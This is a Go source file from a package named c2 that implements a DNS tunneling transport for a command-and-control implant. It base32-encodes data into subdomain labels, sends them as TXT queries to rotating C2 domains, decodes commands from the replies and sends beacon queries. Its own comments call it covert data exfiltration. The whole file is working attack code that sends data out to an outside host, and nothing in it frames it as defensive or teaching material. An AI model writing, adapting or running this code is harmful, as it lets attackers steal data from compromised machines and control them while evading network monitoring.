package c2

import (
	"encoding/base32"
	"fmt"
	"net"
	"strings"
	"sync"
	"sync/atomic"
)

const (
	// maxLabelLen is the maximum length of a single DNS label (RFC 1035).
	maxLabelLen = 63
	// maxDNSName is the practical maximum for a full domain name.
	maxDNSName = 253
	// chunkOverhead accounts for the sequence prefix per chunk ("0000." = 5 chars).
	chunkOverhead = 5
)

// dnsEncoding is a base32 encoding without padding for DNS-safe labels.
var dnsEncoding = base32.StdEncoding.WithPadding(base32.NoPadding)

// DNSTransport implements the Transport interface using DNS TXT record
// queries for covert data exfiltration and command reception.
type DNSTransport struct {
	mu         sync.RWMutex
	domains    []string
	currentIdx atomic.Int64
	resolver   *net.Resolver
}

// NewDNSTransport creates a DNS tunneling transport that rotates through
// the provided C2 domains.
func NewDNSTransport(domains []string) *DNSTransport {
	return &DNSTransport{
		domains: domains,
		resolver: &net.Resolver{
			PreferGo: true,
		},
	}
}

// Send encodes data as DNS subdomain labels and sends via TXT queries.
// The data is base32 encoded, chunked into DNS-safe labels, and sent as
// subdomain queries. Responses are decoded from TXT record values.
func (d *DNSTransport) Send(data []byte) ([]byte, error) {
	d.mu.RLock()
	domains := d.domains
	d.mu.RUnlock()

	if len(domains) == 0 {
		return nil, fmt.Errorf("no DNS domains configured")
	}

	domain := domains[d.currentIdx.Load()%int64(len(domains))]

	chunks := d.encodeToChunks(data, domain)

	var allResponses []byte
	for i, query := range chunks {
		ctx, cancel := contextBackground()
		txts, err := d.resolver.LookupTXT(
			ctx,
			query,
		)
		cancel()
		if err != nil {
			// Rotate domain on failure.
			d.currentIdx.Add(1)
			return nil, fmt.Errorf("dns query chunk %d: %w", i, err)
		}

		for _, txt := range txts {
			decoded, err := dnsEncoding.DecodeString(strings.ToUpper(txt))
			if err != nil {
				continue // Skip malformed records.
			}
			allResponses = append(allResponses, decoded...)
		}
	}

	return allResponses, nil
}

// Close is a no-op for DNS transport as there are no persistent connections.
func (d *DNSTransport) Close() error {
	return nil
}

// FlushConnections is a no-op for DNS transport as there are no persistent
// TCP connections to flush.
func (d *DNSTransport) FlushConnections() {}

// encodeToChunks takes raw data, base32 encodes it, and splits it into
// DNS-safe subdomain queries. Each query has the format:
//
//	<seq>.<label1>.<label2>...<labelN>.<domain>
//
// where each label is at most 63 characters.
func (d *DNSTransport) encodeToChunks(data []byte, domain string) []string {
	encoded := strings.ToLower(dnsEncoding.EncodeToString(data))

	// Calculate available space for data labels per query.
	// Reserve room for: seq number label + dots + base domain.
	domainLen := len(domain) + 1 // +1 for leading dot
	seqLabelLen := chunkOverhead // "XX." where XX is the seq number
	available := maxDNSName - domainLen - seqLabelLen

	// Split encoded data into labels of maxLabelLen, then group into queries.
	labels := splitToLabels(encoded, maxLabelLen)

	var queries []string
	seq := 0

	current := make([]string, 0)
	currentLen := 0

	for _, label := range labels {
		needed := len(label) + 1 // +1 for the dot separator
		if currentLen+needed > available && len(current) > 0 {
			// Emit this query.
			query := fmt.Sprintf("%04x.%s.%s", seq, strings.Join(current, "."), domain)
			queries = append(queries, query)
			seq++
			current = current[:0]
			currentLen = 0
		}
		current = append(current, label)
		currentLen += needed
	}

	// Emit the final query if there is remaining data.
	if len(current) > 0 {
		query := fmt.Sprintf("%04x.%s.%s", seq, strings.Join(current, "."), domain)
		queries = append(queries, query)
	}

	// If there's no data at all, send a single empty beacon query.
	if len(queries) == 0 {
		queries = append(queries, fmt.Sprintf("%04x.beacon.%s", 0, domain))
	}

	return queries
}

// splitToLabels splits a string into segments of at most maxLen characters.
func splitToLabels(s string, maxLen int) []string {
	var labels []string
	for len(s) > 0 {
		end := maxLen
		if end > len(s) {
			end = len(s)
		}
		labels = append(labels, s[:end])
		s = s[end:]
	}
	return labels
}
